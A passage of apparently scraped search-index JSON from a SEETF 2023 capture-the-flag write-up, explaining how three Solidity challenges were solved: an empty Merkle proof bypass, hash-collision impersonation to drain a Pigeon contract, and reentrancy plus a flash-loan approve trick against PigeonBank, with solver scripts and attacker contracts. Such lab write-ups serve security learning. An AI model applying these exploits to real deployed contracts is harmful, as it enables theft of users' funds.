2023","objectID":"/posts/seetf-2023/:1:0","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given three solidity files. Let’s check it first. MerkleProof.sol // SPDX-License-Identifier: Unlicense pragma solidity ^0.8.0; library MerkleProof { // Verify a Merkle proof proving the existence of a leaf in a Merkle tree. Assumes that each pair of leaves and each pair of pre-images in the proof are sorted. function verify(bytes32[] calldata proof, bytes32 root, uint256 index) internal pure returns (bool) { bytes32 computedHash = bytes32(abi.encodePacked(index)); require(root != bytes32(0), \"MerkleProof: Root hash cannot be zero\"); require(computedHash != bytes32(0), \"MerkleProof: Leaf hash cannot be zero\"); for (uint256 i = 0; i \u003c proof.length; i++) { bytes32 proofElement = proof[i]; if (computedHash \u003c proofElement) { // Hash(current computed hash + current element of the proof) computedHash = keccak256(abi.encodePacked(computedHash, proofElement)); } else { // Hash(current element of the proof + current computed hash) computedHash = keccak256(abi.encodePacked(proofElement, computedHash)); } } // Check if the computed hash (root) is equal to the provided root return computedHash == root; } } This file contains a library called MerkleProof, which can be called to verify whether the given index is the leaf of the merkle tree based on the given proof. SEEPass.sol // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.17; import \"./MerkleProof.sol\"; import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\"; contract SEEPass is ERC721 { bytes32 private _merkleRoot; mapping(uint256 =\u003e bool) private _minted; constructor(bytes32 _root) ERC721(\"SEE Pass\", \"SEEP\") { _merkleRoot = _root; } function mintSeePass(bytes32[] calldata _proof, uint256 _tokenId) public { require(!hasMinted(_tokenId), \"Already minted\"); require(verify(_proof, _merkleRoot, _tokenId), \"Invalid proof\"); _minted[_tokenId] = true; _safeMint(msg.sender, _tokenId); } function verify(bytes32[] calldata proof, bytes32 root, uint256 index) public pure returns (bool) { return MerkleProof.verify(proof, root, index); } function hasMinted(uint256 _tokenId) public view returns (bool) { return _minted[_tokenId]; } } This contract is trying to implement their own NFT based on the ERC721 structure. There is a function called mintSeePass that can be used to mint a new NFT. However, before we can mint a new NFT, we need to be able to provide unused tokenId and the correct proof so that we can pass the MerkleProof verification. Setup.sol // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.17; import \"./SEEPass.sol\"; contract Setup { SEEPass public immutable pass; constructor(bytes32 _merkleRoot) { pass = new SEEPass(_merkleRoot); } function isSolved() external view returns (bool) { return pass.balanceOf(msg.sender) \u003e 0; } } This is the setup contract. As you can see, to solve this challenge, the goal is to make the msg.sender (which is us) has at least one NFT. ","date":"Jun 12, 2023","objectID":"/posts/seetf-2023/:1:1","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":"Solution Based on the above initial analysis, we know that the goal is we need to be able to call mintSeePass. However, we need to pass the MerkleProof verification first. After looking at the SEEPass contract and MerkleProof library, I noticed some interesting thing. Let’s re-visit the verify code. // Verify a Merkle proof proving the existence of a leaf in a Merkle tree. Assumes that each pair of leaves and each pair of pre-images in the proof are sorted. function verify(bytes32[] calldata proof, bytes32 root, uint256 index) internal pure returns (bool) { bytes32 computedHash = bytes32(abi.encodePacked(index)); require(root != bytes32(0), \"MerkleProof: Root hash cannot be zero\"); require(computedHash != bytes32(0), \"MerkleProof: Leaf hash cannot be zero\"); for (uint256 i = 0; i \u003c proof.length; i++) { bytes32 proofElement = proof[i]; if (computedHash \u003c proofElement) { // Hash(current computed hash + current element of the proof) computedHash = keccak256(abi.encodePacked(computedHash, proofElement)); } else { // Hash(current element of the proof + current computed hash) computedHash = keccak256(abi.encodePacked(proofElement, computedHash)); } } // Check if the computed hash (root) is equal to the provided root return computedHash == root; } If we set an empty proof and set the index as the uint256 representation of the given root, then we won’t reach the loop. Because of that, the code will compare computedHash == root, which is true in this case because the computedHash is obviously the same as the root. Checking through the SEEPass and Setup contract, we can safely use the uint256 of root as tokenId because it isn’t used yet. Now that we know how to solve this challenge, let’s try to interact with the given host and port to check how to interact with the challenge. nc win.the.seetf.sg 8546 1 - launch new instance 2 - kill instance 3 - acquire flag action? 1 your private blockchain has been deployed! it will automatically terminate in 1 hour here's some useful information uuid: 172a3bb7-439a-46c0-ad7a-6bb6b80a39ba rpc endpoint: http://win.the.seetf.sg:8545/172a3bb7-439a-46c0-ad7a-6bb6b80a39ba private key: 0x0e64f92c4e9fbf6fdfd08e0d80c425cf8e6982ab952efe5f6f52785887f3b552 public key: 0x4644cc78f277A624D4f6EAeDa5E203939147E334 setup contract: 0x8596731EaD6F44cD8bb5E3A448D7defCD12E9047 Okay, so with the given url and port, we can launch a new instance. Some informations that we can get: The private rpc_endpoint. The private key of the player. The setup contract address. However, up until now: We don’t know yet the address of the deployed SEEPass via the Setup contract. We don’t know yet what is the root value. Let’s re-visit the Setup contract. contract Setup { SEEPass public immutable pass; ... } To get the SEEPass address, because it is a public variable, by default, there will be a getter for it. We just need to call pass() to get the address. Now that we know how to get the SEEPass address, we need to know how to fetch the _merkleRoot stored in it. Let’s re-visit the SEEPass contract. contract SEEPass is ERC721 { bytes32 private _merkleRoot; ... constructor(bytes32 _root) ERC721(\"SEE Pass\", \"SEEP\") { _merkleRoot = _root; } } The _merkleRoot was set as private variable, so there won’t be a getter for it. However, nothing is private in a smart contract. Even though it’s private, we can still fetch the value by directly accessing the storage of the contract. Trying to iterate the storage slot one by one, I found that the _merkleRoot was stored in slot 6. After we know the _merkleRoot value, we can simply call the mintSeePass() function with empty proof and _merkleRoot as the tokenId (convert it to uint256). I used python web3 library to interact with the challenge. ","date":"Jun 12, 2023","objectID":"/posts/seetf-2023/:1:2","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":"Full Script from web3 import Web3 from pwn import * url = 'win.the.seetf.sg' port = 8546 def launch_instance(): print('Launch instance...') r = remote(url, port) r.sendlineafter(b'action? ', b'1') r.recvuntil(b'uuid: ') uuid = r.recvline().strip() r.recvuntil(b'rpc endpoint: ') rpc_endpoint = r.recvline().strip() r.recvuntil(b'private key: ') private_key = r.recvline().strip() r.recvuntil(b'setup contract: ') setup_address = r.recvline().strip() r.close() info(f'UUID : {uuid.decode()}') info(f'rpc_endpoint : {rpc_endpoint.decode()}') info(f'private_key : {private_key.decode()}') info(f'setup_address: {setup_address.decode()}') return uuid, rpc_endpoint.decode(), private_key.decode(), setup_address.decode() def kill_instance(uuid): print('Kill instance...') r = remote(url, port) r.sendlineafter(b'action? ', b'2') r.sendlineafter(b'uuid please: ', uuid) r.close() def get_flag(uuid): print('Get Flag...') r = remote(url, port) r.sendlineafter(b'action? ', b'3') r.sendlineafter(b'uuid please: ', uuid) flag = r.readrepeat(1) r.close() return flag # Launch instance uuid = b'' rpc_endpoint = '' private_key = '' setup_address = '' if uuid == b'': uuid, rpc_endpoint, private_key, setup_address = launch_instance() # Connect to the network w3 = Web3(Web3.HTTPProvider(rpc_endpoint)) assert w3.is_connected() player = w3.eth.account.from_key(private_key) info(f'Player address: {player.address}') # Get seepass address setup_abi = [{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"_merkleRoot\",\"type\":\"bytes32\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"isSolved\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pass\",\"outputs\":[{\"internalType\":\"contract SEEPass\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}] setup_contract = w3.eth.contract(address=setup_address, abi=setup_abi) pass_selector = w3.keccak(text='pass()')[:4] output = w3.eth.call({ 'to': setup_address, 'data': pass_selector.hex() }) seepass_address = w3.to_checksum_address(output[12:].hex()) info(f'seepass address: {seepass_address}') # Get merkle root value from storage slot seepass_abi = [{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"_root\",\"type\":\"bytes32\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":False,\"inputs\":[{\"indexed\":True,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":True,\"internalType\":\"address\",\"name\":\"approved\",\"type\":\"address\"},{\"indexed\":True,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":False,\"inputs\":[{\"indexed\":True,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":True,\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"indexed\":False,\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"ApprovalForAll\",\"type\":\"event\"},{\"anonymous\":False,\"inputs\":[{\"indexed\":True,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":True,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":True,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"getApproved\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tokenId\",\"type\":\"uint256\"}],\"name\":\"hasMinted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"functi","date":"Jun 12, 2023","objectID":"/posts/seetf-2023/:1:3","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":"Fiasco Description In the dystopian digital landscape of the near future, a cunning mastermind has kickstarted his plan for ultimate dominance by creating an army of robotic pigeons. These pigeons, six in the beginning, are given a sinister mission: to spy on the public, their focus being on individuals amassing significant Ethereum (ETH) holdings. Each pigeon has been tasked with documenting the ETH each person owns, planning for a future operation to swoop in and siphon off these digital assets. The robotic pigeons, however, are not just spies, but also consumers. They are provided with ETH by their creator to cover their operational expenses, making the network of spy birds self-sustaining and increasingly dangerous. The army operates on a merit-based system, where the pigeon agents earn points for their successful missions. These points pave their path towards promotion, allowing them to ascend the ranks of the robotic army. But, the journey up isn’t free. They must return the earned ETH back to their master for their promotion. Despite the regimented system, the robotic pigeons have a choice. They can choose to desert the army at any point, taking with them the ETH they’ve earned. Will they remain loyal, or will they break free? ","date":"Jun 12, 2023","objectID":"/posts/seetf-2023/:2:0","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given two solidity files. Let’s check it first. Pigeon.sol // SPDX-License-Identifier: UNLICENSED pragma solidity \u003e=0.8.17; contract Pigeon { address private owner; uint256 private ownerBalance; uint256 private juniorPromotion; uint256 private associatePromotion; mapping(bytes32 =\u003e address) private seniorPigeon; mapping(bytes32 =\u003e address) private associatePigeon; mapping(bytes32 =\u003e address) private juniorPigeon; mapping(address =\u003e bool) private isPigeon; mapping(string =\u003e mapping(string =\u003e bool)) private codeToName; mapping(bytes32 =\u003e uint256) private taskPoints; mapping(address =\u003e mapping(address =\u003e uint256)) private dataCollection; mapping(address =\u003e bool) private hasBeenCollected; mapping(bytes32 =\u003e uint256) private treasury; modifier onlyOwner() { if (owner != msg.sender) revert(); _; } modifier oneOfUs() { if (!isPigeon[msg.sender]) revert(); _; } constructor() { owner = msg.sender; juniorPromotion = 8e18; associatePromotion = 12e18; } function becomeAPigeon(string memory code, string memory name) public returns (bytes32 codeName) { codeName = keccak256(abi.encodePacked(code, name)); if (codeToName[code][name]) revert(); if (isPigeon[msg.sender]) revert(); juniorPigeon[codeName] = msg.sender; isPigeon[msg.sender] = true; codeToName[code][name] = true; return codeName; } function task(bytes32 codeName, address person, uint256 data) public oneOfUs { if (person == address(0)) revert(); if (isPigeon[person]) revert(); if (address(person).balance != data) revert(); uint256 points = data; hasBeenCollected[person] = true; dataCollection[msg.sender][person] = points; taskPoints[codeName] += points; } function flyAway(bytes32 codeName, uint256 rank) public oneOfUs { uint256 bag = treasury[codeName]; treasury[codeName] = 0; if (rank == 0) { if (taskPoints[codeName] \u003e juniorPromotion) revert(); (bool success,) = juniorPigeon[codeName].call{value: bag}(\"\"); require(success, \"Transfer failed.\"); } if (rank == 1) { if (taskPoints[codeName] \u003e associatePromotion) revert(); (bool success,) = associatePigeon[codeName].call{value: bag}(\"\"); require(success, \"Transfer failed.\"); } if (rank == 2) { (bool success,) = seniorPigeon[codeName].call{value: bag}(\"\"); require(success, \"Transfer failed.\"); } } function promotion(bytes32 codeName, uint256 desiredRank, string memory newCode, string memory newName) public oneOfUs { if (desiredRank == 1) { if (msg.sender != juniorPigeon[codeName]) revert(); if (taskPoints[codeName] \u003c juniorPromotion) revert(); ownerBalance += treasury[codeName]; bytes32 newCodeName = keccak256(abi.encodePacked(newCode, newName)); if (codeToName[newCode][newName]) revert(); associatePigeon[newCodeName] = msg.sender; codeToName[newCode][newName] = true; taskPoints[codeName] = 0; delete juniorPigeon[codeName]; (bool success,) = owner.call{value: treasury[codeName]}(\"\"); require(success, \"Transfer failed.\"); } if (desiredRank == 2) { if (msg.sender != associatePigeon[codeName]) revert(); if (taskPoints[codeName] \u003c associatePromotion) revert(); ownerBalance += treasury[codeName]; bytes32 newCodeName = keccak256(abi.encodePacked(newCode, newName)); if (codeToName[newCode][newName]) revert(); seniorPigeon[newCodeName] = msg.sender; codeToName[newCode][newName] = true; taskPoints[codeName] = 0; delete seniorPigeon[codeName]; (bool success,) = owner.call{value: treasury[codeName]}(\"\"); require(success, \"Transfer failed.\"); } } function assignPigeon(string memory code, string memory name, address pigeon, uint256 rank) external payable onlyOwner { bytes32 codeName = keccak256(abi.encodePacked(code, name)); if (rank == 0) { juniorPigeon[codeName] = pigeon; treasury[codeName] = msg.value; juniorPigeon[codeName] = pigeon; isPigeon[pigeon] = true; codeToName[code][name] = true; } if (rank == 1) { associatePigeon[codeName] = pigeon; treasury[codeName] = msg.value; associatePigeon[codeName] = pigeon; isPigeon[pigeon] = true; codeToName[code][name] = true; } if (rank == 2) { seniorPigeon[codeNam","date":"Jun 12, 2023","objectID":"/posts/seetf-2023/:2:1","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":"Solution First, in order to interact further with the Pigeon contract, we need to be a pigeon first. To do that, we can call the becomeAPigeon. Let’s check the code first to see whether there is a bug or not. function becomeAPigeon(string memory code, string memory name) public returns (bytes32 codeName) { codeName = keccak256(abi.encodePacked(code, name)); if (codeToName[code][name]) revert(); if (isPigeon[msg.sender]) revert(); juniorPigeon[codeName] = msg.sender; isPigeon[msg.sender] = true; codeToName[code][name] = true; return codeName; } There is a bug with the codeName generation. Notice that to generate the codeName, we basically do hash(code+name). However, this means that we can easily create hash collision to overwrite the existing juniorPigeon mapping. For example, suppose that we want to impersonate junior pigeon (\"Numbuh\", \"5\") (which is one of the pigeon that was infused with ether during the creation). We can simply set our code to \"Numbu\" and our name to \"h5\". The hash result will be the same as (\"Numbuh\", \"5\"). By doing this, we can overwrite the stored address of the juniorPigeon easily. Now, remember that the goal is to drain the balance of pigeon and transfer all of it to us. Notice that there is an interesting function called flyAway. function flyAway(bytes32 codeName, uint256 rank) public oneOfUs { uint256 bag = treasury[codeName]; treasury[codeName] = 0; if (rank == 0) { if (taskPoints[codeName] \u003e juniorPromotion) revert(); (bool success,) = juniorPigeon[codeName].call{value: bag}(\"\"); require(success, \"Transfer failed.\"); } if (rank == 1) { if (taskPoints[codeName] \u003e associatePromotion) revert(); (bool success,) = associatePigeon[codeName].call{value: bag}(\"\"); require(success, \"Transfer failed.\"); } if (rank == 2) { (bool success,) = seniorPigeon[codeName].call{value: bag}(\"\"); require(success, \"Transfer failed.\"); } } If we call flyAway, the address of the pigeon will get treasury[codeName] of ether. Remember that we can easily overwrite the address of any pigeon with our address, so to steal the ether, we can simply: Overwrite the pigeon address with our address via the hash collision in codeName generation. Call flyAway to steal the ether. Our user current rank is still juniorPigeon, and in order to drain the whole pigeon ether, we need to do promotion as well. Luckily, the promotion allowed us to set a new codeName, and the codeName generation is still prone to hash collision. So, on each promotion, we can simply set the codeName to collide with the created pigeon which has ether. To get promotion, we need to do task. However, if we do task, if our taskPoints larger than the threshold set for the promotion, we won’t be able to flyAway. Luckily, there is another bug here. Compare the checks those are used in the flyAway and promotion. function flyAway(bytes32 codeName, uint256 rank) public oneOfUs { uint256 bag = treasury[codeName]; treasury[codeName] = 0; if (rank == 0) { if (taskPoints[codeName] \u003e juniorPromotion) revert(); ... } ... } function promotion(bytes32 codeName, uint256 desiredRank, string memory newCode, string memory newName) public oneOfUs { if (desiredRank == 1) { if (msg.sender != juniorPigeon[codeName]) revert(); if (taskPoints[codeName] \u003c juniorPromotion) revert(); ... } ... } Notice that, if the taskPoints are equals to the promotion’s threshold, we actually can: Call flyAway and steal the ether. Call promotion. We can still do promotion because the check in promotion is allowing equals taskPoints. So, the goal is very clear, we need to do tasks until the points are equal to the given threshold, call flyAway (to steal the ether), and then call promotion so that we can start to steal ether from the higher rank pigeon. To make it easier on controlling the points that we get during calling task, we can simply deploy a dummy contract and then set its balance to crafted value so that the taskPoints can be easily set to be equivalent with the threshold. My solution full flow is like b","date":"Jun 12, 2023","objectID":"/posts/seetf-2023/:2:2","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":"Full Script Dummy Contract // SPDX-License-Identifier: UNLICENSED pragma solidity \u003e=0.8.17; contract TempStorage{ constructor() payable {} receive() external payable {} function getBack() external payable { (bool success,) = msg.sender.call{value: address(this).balance}(\"\"); require(success, \"Failed to transfer\"); } } Solver from web3 import Web3 from pwn import * from solcx import compile_files url = 'win.the.seetf.sg' port = 8548 def launch_instance(): print('Launch instance...') r = remote(url, port) r.sendlineafter(b'action? ', b'1') r.recvuntil(b'uuid: ') uuid = r.recvline().strip() r.recvuntil(b'rpc endpoint: ') rpc_endpoint = r.recvline().strip() r.recvuntil(b'private key: ') private_key = r.recvline().strip() r.recvuntil(b'setup contract: ') setup_address = r.recvline().strip() r.close() print(f'uuid = {uuid}') print(f'rpc_endpoint = \\'{rpc_endpoint.decode()}\\'') print(f'private_key = \\'{private_key.decode()}\\'') print(f'setup_address = \\'{setup_address.decode()}\\'') return uuid, rpc_endpoint.decode(), private_key.decode(), setup_address.decode() def kill_instance(uuid): print('Kill instance...') r = remote(url, port) r.sendlineafter(b'action? ', b'2') r.sendlineafter(b'uuid please: ', uuid) r.close() def get_flag(uuid): print('Get Flag...') r = remote(url, port) r.sendlineafter(b'action? ', b'3') r.sendlineafter(b'uuid please: ', uuid) flag = r.readrepeat(1) r.close() return flag # Launch instance uuid = b'' # uuid = b'e00734cf-96a7-4959-8b3f-6c646a2a5745' # rpc_endpoint = 'http://win.the.seetf.sg:8547/e00734cf-96a7-4959-8b3f-6c646a2a5745' # private_key = '0x98c95134b9c5a731d87e81e4e065ef56630ea6a0d967ee1ba507888d3a53a487' # setup_address = '0x6719eb16425c24c5F2d707254735593b48954abd' if uuid == b'': uuid, rpc_endpoint, private_key, setup_address = launch_instance() # Connect to the network w3 = Web3(Web3.HTTPProvider(rpc_endpoint)) assert w3.is_connected() player = w3.eth.account.from_key(private_key) info(f'Player address: {player.address}, balance: {w3.eth.get_balance(player.address)}') # Get pigeon address setup_abi = [{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"isSolved\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pigeon\",\"outputs\":[{\"internalType\":\"contract Pigeon\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}] setup_contract = w3.eth.contract(address=setup_address, abi=setup_abi) pass_selector = w3.keccak(text='pigeon()')[:4] output = w3.eth.call({ 'to': setup_address, 'data': pass_selector.hex() }) pigeon_address = w3.to_checksum_address(output[12:].hex()) info(f'pigeon_address: {pigeon_address}, balance: {w3.eth.get_balance(pigeon_address)}') # Get current owner pigeon_abi = [{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"code\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"name\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"pigeon\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"rank\",\"type\":\"uint256\"}],\"name\":\"assignPigeon\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"code\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"name\",\"type\":\"string\"}],\"name\":\"becomeAPigeon\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"codeName\",\"type\":\"bytes32\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"codeName\",\"type\":\"bytes32\"},{\"internalType\":\"uint256\",\"name\":\"rank\",\"type\":\"uint256\"}],\"name\":\"flyAway\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"codeName\",\"type\":\"bytes32\"},{\"internalType\":\"uint256\",\"name\":\"desiredRank\",\"type\":\"uint256\"},{\"internalType\":\"string\",\"name\":\"newCode\",\"type\":\"string\"},{\"in","date":"Jun 12, 2023","objectID":"/posts/seetf-2023/:2:3","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":"Pigeon Bank Description The new era is coming. Pigeons are invading and in order to survive, the SEE Team created PigeonBank so that people can get extremely high interest rate. Hold PETH to get high interest. PETH is strictly controlled by the SEE team to prevent manipulation and corruption. ","date":"Jun 12, 2023","objectID":"/posts/seetf-2023/:3:0","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given three solidity files. Let’s check it. PETH.sol // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.17; import \"@openzeppelin/contracts/access/Ownable.sol\"; import \"@openzeppelin/contracts/utils/Address.sol\"; contract PETH is Ownable { using Address for address; using Address for address payable; string public constant name = \"Pigeon ETH\"; string public constant symbol = \"PETH\"; uint8 public constant decimals = 18; event Approval(address indexed src, address indexed dst, uint256 amt); event Transfer(address indexed src, address indexed dst, uint256 amt); event Deposit(address indexed dst, uint256 amt); event Withdrawal(address indexed src, uint256 amt); mapping(address =\u003e uint256) public balanceOf; mapping(address =\u003e mapping(address =\u003e uint256)) public allowance; receive() external payable { revert(\"PETH: Do not send ETH directly\"); } function deposit(address _userAddress) public payable onlyOwner { _mint(_userAddress, msg.value); emit Deposit(_userAddress, msg.value); // return msg.value; } function withdraw(address _userAddress, uint256 _wad) public onlyOwner { payable(_userAddress).sendValue(_wad); _burn(_userAddress, _wad); // require(success, \"SEETH: withdraw failed\"); emit Withdrawal(_userAddress, _wad); } function withdrawAll(address _userAddress) public onlyOwner { payable(_userAddress).sendValue(balanceOf[_userAddress]); _burnAll(_userAddress); // require(success, \"SEETH: withdraw failed\"); emit Withdrawal(_userAddress, balanceOf[_userAddress]); } function totalSupply() public view returns (uint256) { return address(this).balance; } function approve(address guy, uint256 wad) public returns (bool) { allowance[msg.sender][guy] = wad; emit Approval(msg.sender, guy, wad); return true; } function transfer(address dst, uint256 wad) public returns (bool) { return transferFrom(msg.sender, dst, wad); } function transferFrom(address src, address dst, uint256 wad) public returns (bool) { require(balanceOf[src] \u003e= wad); if (src != msg.sender \u0026\u0026 allowance[src][msg.sender] != type(uint256).max) { require(allowance[src][msg.sender] \u003e= wad); allowance[src][msg.sender] -= wad; } balanceOf[src] -= wad; balanceOf[dst] += wad; emit Transfer(src, dst, wad); return true; } function flashLoan(address _userAddress, uint256 _wad, bytes calldata data) public onlyOwner { require(_wad \u003c= address(this).balance, \"PETH: wad exceeds balance\"); require(Address.isContract(_userAddress), \"PETH: Borrower must be a contract\"); uint256 userBalanceBefore = address(this).balance; // @dev Send Ether to borrower (Borrower must implement receive() function) // (bool success, bytes memory returndata) = target.call{value: value}(data); Address.functionCallWithValue(_userAddress, data, _wad); uint256 userBalanceAfter = address(this).balance; require(userBalanceAfter \u003e= userBalanceBefore, \"PETH: You did not return my Ether!\"); // @dev if user gave me more Ether, refund it if (userBalanceAfter \u003e userBalanceBefore) { uint256 refund = userBalanceAfter - userBalanceBefore; payable(_userAddress).sendValue(refund); } } // ========== INTERNAL FUNCTION ========== function _mint(address dst, uint256 wad) internal { balanceOf[dst] += wad; } function _burn(address src, uint256 wad) internal { require(balanceOf[src] \u003e= wad); balanceOf[src] -= wad; } function _burnAll(address _userAddress) internal { _burn(_userAddress, balanceOf[_userAddress]); } } This contract is trying to implement a coin. Skimming through it, one thing that is interesting is that it has flashLoan feature. Another thing is that some functions can only be called by the owner of the contract. PigeonBank.sol // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.17; import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\"; import \"@openzeppelin/contracts/utils/Address.sol\"; import \"./PETH.sol\"; // Deposit Ether to PigeonBank to get PETH // @TODO: Implement interest rate feature so that users can get interest by depositing Ether contract Pigeon","date":"Jun 12, 2023","objectID":"/posts/seetf-2023/:3:1","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":"Solution First, let’s check the flashLoan feature. function flashLoan(address _userAddress, uint256 _wad, bytes calldata data) public onlyOwner { require(_wad \u003c= address(this).balance, \"PETH: wad exceeds balance\"); require(Address.isContract(_userAddress), \"PETH: Borrower must be a contract\"); uint256 userBalanceBefore = address(this).balance; // @dev Send Ether to borrower (Borrower must implement receive() function) // (bool success, bytes memory returndata) = target.call{value: value}(data); Address.functionCallWithValue(_userAddress, data, _wad); uint256 userBalanceAfter = address(this).balance; require(userBalanceAfter \u003e= userBalanceBefore, \"PETH: You did not return my Ether!\"); // @dev if user gave me more Ether, refund it if (userBalanceAfter \u003e userBalanceBefore) { uint256 refund = userBalanceAfter - userBalanceBefore; payable(_userAddress).sendValue(refund); } } I noticed that we can actually make the PETH contract as the _userAddress param, and then set the _wad value to 0. By doing this, we can actually make the PETH contract to call one of their own function (via the Address.functionCallWithValue). Looking for the functions that doesn’t have onlyOwner modifier, there is one interesting function, which is approve. function approve(address guy, uint256 wad) public returns (bool) { allowance[msg.sender][guy] = wad; emit Approval(msg.sender, guy, wad); return true; } The idea is that if we call flashLoan and set the _userAddress to PETH contract itself, and then set the calldata to call approve(), we can actually force the PETH to set any allowance to our desired address, so that the desired address can spend the PETH money. However, notice that PETH doesn’t have any money actually. So, we need to look for another bug. The other bug is actually a reentrancy bug inside the withdrawAll method. function withdrawAll(address _userAddress) public onlyOwner { payable(_userAddress).sendValue(balanceOf[_userAddress]); _burnAll(_userAddress); // require(success, \"SEETH: withdraw failed\"); emit Withdrawal(_userAddress, balanceOf[_userAddress]); } function _burnAll(address _userAddress) internal { _burn(_userAddress, balanceOf[_userAddress]); } There’s a problem with this method. It sends the ether to the user before burning the PETH coin. This is vulnerable to reentrancy attack. The scenario is like below: Contract call deposit x ether. Contract call withdrawAll. The PETH contract send the ether first. The contract has receive() method, which will be triggered during receiving value that was being sent by PETH. The contract call transfer() to send the just received value to PETH. Now, after this call, the state will be: PETH coin’s balance is increase by x ether. Yet, the contract still received x ether. Repeating the above scenario, at some point, the PETH coin’s balance will become 2500 ether. And because of the flashLoan that we call before already permit us to spend the PETH coin’s balance, we can simply transfer all of PETH coin’s balance to us and withdraw it to drain the bank. ","date":"Jun 12, 2023","objectID":"/posts/seetf-2023/:3:2","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":"Full Script Attacker Contract // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.17; import \"./PETH.sol\"; import \"./PigeonBank.sol\"; contract Attacker { PETH peth; PigeonBank bank; bool stopAttack; constructor(address _peth, address _bank) payable { peth = PETH(payable(_peth)); bank = PigeonBank(payable(_bank)); stopAttack = false; } 